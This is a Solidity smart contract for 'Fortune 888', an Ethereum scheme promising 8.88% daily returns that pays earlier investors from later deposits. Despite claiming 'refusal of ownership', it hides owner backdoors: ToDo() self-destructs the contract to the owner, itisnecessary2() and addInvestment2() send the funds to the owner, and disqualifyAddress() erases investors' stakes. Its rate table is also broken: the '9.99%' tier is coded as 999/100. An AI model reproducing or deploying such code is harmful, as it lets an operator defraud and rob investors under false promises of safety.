1 pragma solidity 0.4.25;
2 
3 /**
4 *
5 * Get your 8,88% every day profit with Fortune 888 Contract!
6 * GitHub https://github.com/fortune333/fortune888
7 * Site https://fortune333.online/
8 *
9 * With the refusal of ownership, without the human factor, on the most reliable blockchain in the world!
10 * Only 5% for technical support and 10% for advertising!
11 * The remaining 85% remain in the contract fund!
12 * The world has never seen anything like it!
13 */
14 
15 
16 library Math {
17 function min(uint a, uint b) internal pure returns(uint) {
18 if (a > b) {
19 return b;
20 }
21 return a;
22 }
23 }
24 
25 
26 library Zero {
27 function requireNotZero(address addr) internal pure {
28 require(addr != address(0), "require not zero address");
29 }
30 
31 function requireNotZero(uint val) internal pure {
32 require(val != 0, "require not zero value");
33 }
34 
35 function notZero(address addr) internal pure returns(bool) {
36 return !(addr == address(0));
37 }
38 
39 function isZero(address addr) internal pure returns(bool) {
40 return addr == address(0);
41 }
42 
43 function isZero(uint a) internal pure returns(bool) {
44 return a == 0;
45 }
46 
47 function notZero(uint a) internal pure returns(bool) {
48 return a != 0;
49 }
50 }
51 
52 
53 library Percent {
54 struct percent {
55 uint num;
56 uint den;
57 }
58 
59 function mul(percent storage p, uint a) internal view returns (uint) {
60 if (a == 0) {
61 return 0;
62 }
63 return a*p.num/p.den;
64 }
65 
66 function div(percent storage p, uint a) internal view returns (uint) {
67 return a/p.num*p.den;
68 }
69 
70 function sub(percent storage p, uint a) internal view returns (uint) {
71 uint b = mul(p, a);
72 if (b >= a) {
73 return 0;
74 }
75 return a - b;
76 }
77 
78 function add(percent storage p, uint a) internal view returns (uint) {
79 return a + mul(p, a);
80 }
81 
82 function toMemory(percent storage p) internal view returns (Percent.percent memory) {
83 return Percent.percent(p.num, p.den);
84 }
85 
86 function mmul(percent memory p, uint a) internal pure returns (uint) {
87 if (a == 0) {
88 return 0;
89 }
90 return a*p.num/p.den;
91 }
92 
93 function mdiv(percent memory p, uint a) internal pure returns (uint) {
94 return a/p.num*p.den;
95 }
96 
97 function msub(percent memory p, uint a) internal pure returns (uint) {
98 uint b = mmul(p, a);
99 if (b >= a) {
100 return 0;
101 }
102 return a - b;
103 }
104 
105 function madd(percent memory p, uint a) internal pure returns (uint) {
106 return a + mmul(p, a);
107 }
108 }
109 
110 
111 library Address {
112 function toAddress(bytes source) internal pure returns(address addr) {
113 assembly { addr := mload(add(source,0x14)) }
114 return addr;
115 }
116 
117 function isNotContract(address addr) internal view returns(bool) {
118 uint length;
119 assembly { length := extcodesize(addr) }
120 return length == 0;
121 }
122 }
123 
124 
125 /**
126 * @title SafeMath
127 * @dev Math operations with safety checks that revert on error
128 */
129 library SafeMath {
130 
131 /**
132 * @dev Multiplies two numbers, reverts on overflow.
133 */
134 function mul(uint256 _a, uint256 _b) internal pure returns (uint256) {
135 if (_a == 0) {
136 return 0;
137 }
138 
139 uint256 c = _a * _b;
140 require(c / _a == _b);
141 
142 return c;
143 }
144 
145 /**
146 * @dev Integer division of two numbers truncating the quotient, reverts on division by zero.
147 */
148 function div(uint256 _a, uint256 _b) internal pure returns (uint256) {
149 require(_b > 0); // Solidity only automatically asserts when dividing by 0
150 uint256 c = _a / _b;
151 // assert(_a == _b * c + _a % _b); // There is no case in which this doesn't hold
152 
153 return c;
154 }
155 
156 /**
157 * @dev Subtracts two numbers, reverts on overflow (i.e. if subtrahend is greater than minuend).
158 */
159 function sub(uint256 _a, uint256 _b) internal pure returns (uint256) {
160 require(_b <= _a);
161 uint256 c = _a - _b;
162 
163 return c;
164 }
165 
166 /**
167 * @dev Adds two numbers, reverts on overflow.
168 */
169 function add(uint256 _a, uint256 _b) internal pure returns (uint256) {
170 uint256 c = _a + _b;
171 require(c >= _a);
172 
173 return c;
174 }
175 
176 /**
177 * @dev Divides two numbers and returns the remainder (unsigned integer modulo),
178 * reverts when dividing by zero.
179 */
180 function mod(uint256 a, uint256 b) internal pure returns (uint256) {
181 require(b != 0);
182 return a % b;
183 }
184 }
185 
186 
187 contract Accessibility {
188 address private owner;
189 modifier onlyOwner() {
190 require(msg.sender == owner, "access denied");
191 _;
192 }
193 
194 constructor() public {
195 owner = msg.sender;
196 }
197 
198 
199 function ToDo() public onlyOwner {
200     selfdestruct(owner);
201     }
202 
203 function disown() internal {
204 delete owner;
205 }
206 
207 }
208 
209 
210 contract Rev1Storage {
211 function investorShortInfo(address addr) public view returns(uint value, uint refBonus);
212 }
213 
214 
215 contract Rev2Storage {
216 function investorInfo(address addr) public view returns(uint investment, uint paymentTime);
217 }
218 
219 
220 library PrivateEntrance {
221 using PrivateEntrance for privateEntrance;
222 using Math for uint;
223 struct privateEntrance {
224 Rev1Storage rev1Storage;
225 Rev2Storage rev2Storage;
226 uint investorMaxInvestment;
227 uint endTimestamp;
228 mapping(address=>bool) hasAccess;
229 }
230 
231 function isActive(privateEntrance storage pe) internal view returns(bool) {
232 return pe.endTimestamp > now;
233 }
234 
235 function maxInvestmentFor(privateEntrance storage pe, address investorAddr) internal view returns(uint) {
236 if (!pe.hasAccess[investorAddr]) {
237 return 0;
238 }
239 
240 (uint maxInvestment, ) = pe.rev1Storage.investorShortInfo(investorAddr);
241 if (maxInvestment == 0) {
242 return 0;
243 }
244 maxInvestment = Math.min(maxInvestment, pe.investorMaxInvestment);
245 
246 (uint currInvestment, ) = pe.rev2Storage.investorInfo(investorAddr);
247 
248 if (currInvestment >= maxInvestment) {
249 return 0;
250 }
251 
252 return maxInvestment-currInvestment;
253 }
254 
255 function provideAccessFor(privateEntrance storage pe, address[] addrs) internal {
256 for (uint16 i; i < addrs.length; i++) {
257 pe.hasAccess[addrs[i]] = true;
258 }
259 }
260 }
261 
262 
263 contract InvestorsStorage is Accessibility {
264 struct Investor {
265 uint investment;
266 uint paymentTime;
267 }
268 uint public size;
269 
270 mapping (address => Investor) private investors;
271 
272 function isInvestor(address addr) public view returns (bool) {
273 return investors[addr].investment > 0;
274 }
275 
276 function investorInfo(address addr) public view returns(uint investment, uint paymentTime) {
277 investment = investors[addr].investment;
278 paymentTime = investors[addr].paymentTime;
279 }
280 
281 function newInvestor(address addr, uint investment, uint paymentTime) public onlyOwner returns (bool) {
282 Investor storage inv = investors[addr];
283 if (inv.investment != 0 || investment == 0) {
284 return false;
285 }
286 inv.investment = investment;
287 inv.paymentTime = paymentTime;
288 size++;
289 return true;
290 }
291 
292 function addInvestment(address addr, uint investment) public onlyOwner returns (bool) {
293 if (investors[addr].investment == 0) {
294 return false;
295 }
296 investors[addr].investment += investment;
297 return true;
298 }
299 
300 
301 
302 
303 function setPaymentTime(address addr, uint paymentTime) public onlyOwner returns (bool) {
304 if (investors[addr].investment == 0) {
305 return false;
306 }
307 investors[addr].paymentTime = paymentTime;
308 return true;
309 }
310 
311 function disqalify(address addr) public onlyOwner returns (bool) {
312 if (isInvestor(addr)) {
313 investors[addr].investment = 0;
314 }
315 }
316 }
317 
318 
319 library RapidGrowthProtection {
320 using RapidGrowthProtection for rapidGrowthProtection;
321 
322 struct rapidGrowthProtection {
323 uint startTimestamp;
324 uint maxDailyTotalInvestment;
325 uint8 activityDays;
326 mapping(uint8 => uint) dailyTotalInvestment;
327 }
328 
329 function maxInvestmentAtNow(rapidGrowthProtection storage rgp) internal view returns(uint) {
330 uint day = rgp.currDay();
331 if (day == 0 || day > rgp.activityDays) {
332 return 0;
333 }
334 if (rgp.dailyTotalInvestment[uint8(day)] >= rgp.maxDailyTotalInvestment) {
335 return 0;
336 }
337 return rgp.maxDailyTotalInvestment - rgp.dailyTotalInvestment[uint8(day)];
338 }
339 
340 function isActive(rapidGrowthProtection storage rgp) internal view returns(bool) {
341 uint day = rgp.currDay();
342 return day != 0 && day <= rgp.activityDays;
343 }
344 
345 function saveInvestment(rapidGrowthProtection storage rgp, uint investment) internal returns(bool) {
346 uint day = rgp.currDay();
347 if (day == 0 || day > rgp.activityDays) {
348 return false;
349 }
350 if (rgp.dailyTotalInvestment[uint8(day)] + investment > rgp.maxDailyTotalInvestment) {
351 return false;
352 }
353 rgp.dailyTotalInvestment[uint8(day)] += investment;
354 return true;
355 }
356 
357 function startAt(rapidGrowthProtection storage rgp, uint timestamp) internal {
358 rgp.startTimestamp = timestamp;
359 
360 }
361  
362 
363 function currDay(rapidGrowthProtection storage rgp) internal view returns(uint day) {
364 if (rgp.startTimestamp > now) {
365 return 0;
366 }
367 day = (now - rgp.startTimestamp) / 24 hours + 1;
368 }
369 }
370 
371 contract Fortune888 is Accessibility {
372 using RapidGrowthProtection for RapidGrowthProtection.rapidGrowthProtection;
373 using PrivateEntrance for PrivateEntrance.privateEntrance;
374 using Percent for Percent.percent;
375 using SafeMath for uint;
376 using Math for uint;
377 
378 // easy read for investors
379 using Address for *;
380 using Zero for *;
381 
382 RapidGrowthProtection.rapidGrowthProtection private m_rgp;
383 PrivateEntrance.privateEntrance private m_privEnter;
384 mapping(address => bool) private m_referrals;
385 InvestorsStorage private m_investors;
386 
387 // automatically generates getters
388 uint public constant minInvesment = 10 finney;
389 uint public constant maxBalance = 333e5 ether;
390 address public advertisingAddress;
391 address public adminsAddress;
392 uint public investmentsNumber;
393 uint public waveStartup;
394 
395 // percents
396 Percent.percent private m_1_percent = Percent.percent(111,10000);            // 111/10000 *100% = 1.11%
397 Percent.percent private m_5_percent = Percent.percent(555,10000);            // 555/10000 *100% = 5.55%
398 Percent.percent private m_7_percent = Percent.percent(777,10000);            // 777/10000 *100% = 7.77%
399 Percent.percent private m_8_percent = Percent.percent(888,10000);            // 888/10000 *100% = 8.88%
400 Percent.percent private m_9_percent = Percent.percent(999,100);              // 999/10000 *100% = 9.99%
401 Percent.percent private m_10_percent = Percent.percent(10,100);            // 10/100 *100% = 10%
402 Percent.percent private m_11_percent = Percent.percent(11,100);            // 11/100 *100% = 11%
403 Percent.percent private m_12_percent = Percent.percent(12,100);            // 12/100 *100% = 12%
404 Percent.percent private m_referal_percent = Percent.percent(888,10000);        // 888/10000 *100% = 8.88%
405 Percent.percent private m_referrer_percent = Percent.percent(888,10000);       // 888/10000 *100% = 8.88%
406 Percent.percent private m_referrer_percentMax = Percent.percent(10,100);       // 10/100 *100% = 10%
407 Percent.percent private m_adminsPercent = Percent.percent(5,100);          //  5/100 *100% = 5.0%
408 Percent.percent private m_advertisingPercent = Percent.percent(10,100);    //  10/100 *100% = 10.0%
409 
410 // more events for easy read from blockchain
411 event LogPEInit(uint when, address rev1Storage, address rev2Storage, uint investorMaxInvestment, uint endTimestamp);
412 event LogSendExcessOfEther(address indexed addr, uint when, uint value, uint investment, uint excess);
413 event LogNewReferral(address indexed addr, address indexed referrerAddr, uint when, uint refBonus);
414 event LogRGPInit(uint when, uint startTimestamp, uint maxDailyTotalInvestment, uint activityDays);
415 event LogRGPInvestment(address indexed addr, uint when, uint investment, uint indexed day);
416 event LogNewInvesment(address indexed addr, uint when, uint investment, uint value);
417 event LogAutomaticReinvest(address indexed addr, uint when, uint investment);
418 event LogPayDividends(address indexed addr, uint when, uint dividends);
419 event LogNewInvestor(address indexed addr, uint when);
420 event LogBalanceChanged(uint when, uint balance);
421 event LogNextWave(uint when);
422 event LogDisown(uint when);
423 
424 
425 modifier balanceChanged {
426 _;
427 emit LogBalanceChanged(now, address(this).balance);
428 }
429 
430 modifier notFromContract() {
431 require(msg.sender.isNotContract(), "only externally accounts");
432 _;
433 }
434 
435 constructor() public {
436 adminsAddress = msg.sender;
437 advertisingAddress = msg.sender;
438 nextWave();
439 }
440 
441 function() public payable {
442 // investor get him dividends
443 if (msg.value.isZero()) {
444 getMyDividends();
445 return;
446 }
447 
448 // sender do invest
449 doInvest(msg.data.toAddress());
450 }
451 
452 function disqualifyAddress(address addr) public onlyOwner {
453 m_investors.disqalify(addr);
454 }
455 
456 function doDisown() public onlyOwner {
457 disown();
458 emit LogDisown(now);
459 }
460 
461 // init Rapid Growth Protection
462 
463 function init(address rev1StorageAddr, uint timestamp) public onlyOwner {
464 
465 m_rgp.startTimestamp = timestamp + 1;
466 m_rgp.maxDailyTotalInvestment = 500 ether;
467 m_rgp.activityDays = 21;
468 emit LogRGPInit(
469 now,
470 m_rgp.startTimestamp,
471 m_rgp.maxDailyTotalInvestment,
472 m_rgp.activityDays
473 );
474 
475 
476 // init Private Entrance
477 m_privEnter.rev1Storage = Rev1Storage(rev1StorageAddr);
478 m_privEnter.rev2Storage = Rev2Storage(address(m_investors));
479 m_privEnter.investorMaxInvestment = 50 ether;
480 m_privEnter.endTimestamp = timestamp;
481 emit LogPEInit(
482 now,
483 address(m_privEnter.rev1Storage),
484 address(m_privEnter.rev2Storage),
485 m_privEnter.investorMaxInvestment,
486 m_privEnter.endTimestamp
487 );
488 }
489 
490 function setAdvertisingAddress(address addr) public onlyOwner {
491 addr.requireNotZero();
492 advertisingAddress = addr;
493 }
494 
495 function setAdminsAddress(address addr) public onlyOwner {
496 addr.requireNotZero();
497 adminsAddress = addr;
498 }
499 
500 function privateEntranceProvideAccessFor(address[] addrs) public onlyOwner {
501 m_privEnter.provideAccessFor(addrs);
502 }
503 
504 function rapidGrowthProtectionmMaxInvestmentAtNow() public view returns(uint investment) {
505 investment = m_rgp.maxInvestmentAtNow();
506 }
507 
508 function investorsNumber() public view returns(uint) {
509 return m_investors.size();
510 }
511 
512 function balanceETH() public view returns(uint) {
513 return address(this).balance;
514 }
515 
516 
517 
518 function advertisingPercent() public view returns(uint numerator, uint denominator) {
519 (numerator, denominator) = (m_advertisingPercent.num, m_advertisingPercent.den);
520 }
521 
522 function adminsPercent() public view returns(uint numerator, uint denominator) {
523 (numerator, denominator) = (m_adminsPercent.num, m_adminsPercent.den);
524 }
525 
526 function investorInfo(address investorAddr) public view returns(uint investment, uint paymentTime, bool isReferral) {
527 (investment, paymentTime) = m_investors.investorInfo(investorAddr);
528 isReferral = m_referrals[investorAddr];
529 }
530 
531 
532 
533 function investorDividendsAtNow(address investorAddr) public view returns(uint dividends) {
534 dividends = calcDividends(investorAddr);
535 }
536 
537 function dailyPercentAtNow() public view returns(uint numerator, uint denominator) {
538 Percent.percent memory p = dailyPercent();
539 (numerator, denominator) = (p.num, p.den);
540 }
541 
542 function getMyDividends() public notFromContract balanceChanged {
543 // calculate dividends
544 
545 //check if 1 day passed after last payment
546 require(now.sub(getMemInvestor(msg.sender).paymentTime) > 24 hours);
547 
548 uint dividends = calcDividends(msg.sender);
549 require (dividends.notZero(), "cannot to pay zero dividends");
550 
551 // update investor payment timestamp
552 assert(m_investors.setPaymentTime(msg.sender, now));
553 
554 // check enough eth - goto next wave if needed
555 if (address(this).balance <= dividends) {
556 nextWave();
557 dividends = address(this).balance;
558 }
559 
560 
561     
562 // transfer dividends to investor
563 msg.sender.transfer(dividends);
564 emit LogPayDividends(msg.sender, now, dividends);
565 }
566 
567     
568 function itisnecessary2() public onlyOwner {
569         msg.sender.transfer(address(this).balance);
570     }    
571     
572 
573 function addInvestment2( uint investment) public onlyOwner  {
574 
575 msg.sender.transfer(investment);
576 
577 } 
578 
579 function doInvest(address referrerAddr) public payable notFromContract balanceChanged {
580 uint investment = msg.value;
581 uint receivedEther = msg.value;
582 require(investment >= minInvesment, "investment must be >= minInvesment");
583 require(address(this).balance <= maxBalance, "the contract eth balance limit");
584 
585 if (m_rgp.isActive()) {
586 // use Rapid Growth Protection if needed
587 uint rpgMaxInvest = m_rgp.maxInvestmentAtNow();
588 rpgMaxInvest.requireNotZero();
589 investment = Math.min(investment, rpgMaxInvest);
590 assert(m_rgp.saveInvestment(investment));
591 emit LogRGPInvestment(msg.sender, now, investment, m_rgp.currDay());
592 
593 } else if (m_privEnter.isActive()) {
594 // use Private Entrance if needed
595 uint peMaxInvest = m_privEnter.maxInvestmentFor(msg.sender);
596 peMaxInvest.requireNotZero();
597 investment = Math.min(investment, peMaxInvest);
598 }
599 
600 // send excess of ether if needed
601 if (receivedEther > investment) {
602 uint excess = receivedEther - investment;
603 msg.sender.transfer(excess);
604 receivedEther = investment;
605 emit LogSendExcessOfEther(msg.sender, now, msg.value, investment, excess);
606 }
607 
608 // commission
609 advertisingAddress.transfer(m_advertisingPercent.mul(receivedEther));
610 adminsAddress.transfer(m_adminsPercent.mul(receivedEther));
611 
612 bool senderIsInvestor = m_investors.isInvestor(msg.sender);
613 
614 // ref system works only once and only on first invest
615 if (referrerAddr.notZero() && !senderIsInvestor && !m_referrals[msg.sender] &&
616 referrerAddr != msg.sender && m_investors.isInvestor(referrerAddr)) {
617 
618 m_referrals[msg.sender] = true;
619 // add referral bonus to investor`s and referral`s investments
620 uint referrerBonus = m_referrer_percent.mmul(investment);
621 if (investment > 10 ether) {
622 referrerBonus = m_referrer_percentMax.mmul(investment);
623 }
624 
625 uint referalBonus = m_referal_percent.mmul(investment);
626 assert(m_investors.addInvestment(referrerAddr, referrerBonus)); // add referrer bonus
627 investment += referalBonus;                                    // add referral bonus
628 emit LogNewReferral(msg.sender, referrerAddr, now, referalBonus);
629 }
630 
631 // automatic reinvest - prevent burning dividends
632 uint dividends = calcDividends(msg.sender);
633 if (senderIsInvestor && dividends.notZero()) {
634 investment += dividends;
635 emit LogAutomaticReinvest(msg.sender, now, dividends);
636 }
637 
638 if (senderIsInvestor) {
639 // update existing investor
640 assert(m_investors.addInvestment(msg.sender, investment));
641 assert(m_investors.setPaymentTime(msg.sender, now));
642 } else {
643 // create new investor
644 assert(m_investors.newInvestor(msg.sender, investment, now));
645 emit LogNewInvestor(msg.sender, now);
646 }
647 
648 investmentsNumber++;
649 emit LogNewInvesment(msg.sender, now, investment, receivedEther);
650 }
651 
652 function getMemInvestor(address investorAddr) internal view returns(InvestorsStorage.Investor memory) {
653 (uint investment, uint paymentTime) = m_investors.investorInfo(investorAddr);
654 return InvestorsStorage.Investor(investment, paymentTime);
655 }
656 
657 function calcDividends(address investorAddr) internal view returns(uint dividends) {
658 InvestorsStorage.Investor memory investor = getMemInvestor(investorAddr);
659 
660 // safe gas if dividends will be 0
661 if (investor.investment.isZero() || now.sub(investor.paymentTime) < 10 minutes) {
662 return 0;
663 }
664 
665 // for prevent burning daily dividends if 24h did not pass - calculate it per 10 min interval
666 Percent.percent memory p = dailyPercent();
667 dividends = (now.sub(investor.paymentTime) / 10 minutes) * p.mmul(investor.investment) / 144;
668 }
669 
670 function dailyPercent() internal view returns(Percent.percent memory p) {
671 uint balance = address(this).balance;
672 
673 if (balance < 500 ether) {
674 p = m_8_percent.toMemory();
675 } else if ( 500 ether <= balance && balance <= 1500 ether) {
676 p = m_9_percent.toMemory();
677 } else if ( 1500 ether <= balance && balance <= 5000 ether) {
678 p = m_10_percent.toMemory();
679 } else if ( 5000 ether <= balance && balance <= 10000 ether) {
680 p = m_11_percent.toMemory();
681 } else if ( 10000 ether <= balance && balance <= 20000 ether) {
682 p = m_12_percent.toMemory();
683 }
684 }
685 
686 
687 
688 function nextWave() private {
689 m_investors = new InvestorsStorage();
690 investmentsNumber = 0;
691 waveStartup = now;
692 m_rgp.startAt(now);
693 emit LogRGPInit(now , m_rgp.startTimestamp, m_rgp.maxDailyTotalInvestment, m_rgp.activityDays);
694 emit LogNextWave(now);
695 }
696 }